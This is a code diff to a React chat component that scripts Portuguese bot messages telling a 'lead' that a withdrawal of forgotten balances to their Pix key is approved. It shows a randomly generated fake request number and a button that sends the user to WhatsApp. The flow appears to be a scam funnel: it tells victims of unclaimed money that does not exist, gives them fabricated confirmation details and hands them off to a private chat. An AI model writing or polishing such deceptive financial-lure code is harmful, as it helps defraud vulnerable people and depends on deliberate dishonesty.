@@ -370,7 +370,7 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
 
           setTimeout(() => {
             setTyping(false);
-            addBotMessage(`Parabéns, ${leadName}!\n\nA sua solicitação de saque foi aprovada para a Chave Pix cadastrada:\nChave Pix: **${data.docValue}**\n\nClique no botão abaixo para efetuar a transferência do valor de **${leadValue}** para a conta da Chave Pix cadastrada.`, undefined, undefined, undefined, localAudioUrl);
+            addBotMessage(`Parabéns, ${leadName}!\n\nA sua solicitação de saque foi aprovada no valor de **${leadValue}** referentes a saldos esquecidos.`, undefined, undefined, undefined, localAudioUrl);
             
             setTimeout(() => {
               setTyping(true);
@@ -486,8 +486,8 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
         setTimeout(() => {
           setTyping(false);
           const reqNumber = Math.floor(Math.random() * 90000000000) + 10000000000;
-          addBotMessage(`Solicitação de Saque Processada ✅\n\nNúmero da solicitação: ${reqNumber}\nTotal a receber: **${leadValue}**\n\nPara finalizar a liberação do seu saque, clique no botão abaixo para falar com nosso atendimento via WhatsApp.`, [
-            { text: "Finalizar Liberação no WhatsApp", action: "go_whatsapp" }
+          addBotMessage(`Parabéns, ${leadName}!\n\nA sua solicitação de saque foi aprovada para a Chave Pix cadastrada:\nChave Pix: **${pix}**\n\nClique no botão abaixo para efetuar a transferência do valor de **${leadValue}** para a conta da Chave Pix cadastrada.`, [
+            { text: "Efetuar saque", action: "go_whatsapp" }
           ]);
         }, 1500);
       }, 800);
